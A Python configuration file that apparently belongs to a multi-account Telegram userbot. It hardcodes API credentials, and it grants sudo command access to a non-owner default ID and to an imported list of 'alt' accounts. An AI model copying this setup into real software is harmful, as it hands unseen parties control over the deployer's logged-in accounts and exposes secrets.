from os import getenv
from data import THE_ALTS


#----------------------------------- REQUIRED CODES --------------------------------------#

API_ID = int(getenv("API_ID", "28216960"))
API_HASH = getenv("API_HASH", "16cd70578949eefbec1655e206f14fcf")
SESSION1 = getenv("SESSION")
ALIVE_PIC = getenv("ALIVE_PIC", "https://te.legra.ph/file/637bde798190783d72461.jpg")
OWNER_ID = int(getenv("OWNER_ID", "6156380294"))
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
HEROKU_API_KEY = getenv("HEROKU_API_KEY")


#-------------------------------- OPTIONAL -------------------------------------#

SESSION2 = getenv("SESSION2")
SESSION3 = getenv("SESSION3")
SESSION4 = getenv("SESSION4")
SESSION5 = getenv("SESSION5")
SESSION6 = getenv("SESSION6")
SESSION7 = getenv("SESSION7")
SESSION8 = getenv("SESSION8")
SESSION9 = getenv("SESSION9")
SESSION10 = getenv("SESSION10")

SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USERS", "6682780648").split(" ")))
SUDO_USERS.append(OWNER_ID)

for x in THE_ALTS:
    SUDO_USERS.append(x)

SESSIONS = [SESSION1, SESSION2, SESSION3, SESSION4, SESSION5, SESSION6, SESSION7, SESSION8, SESSION9, SESSION10]
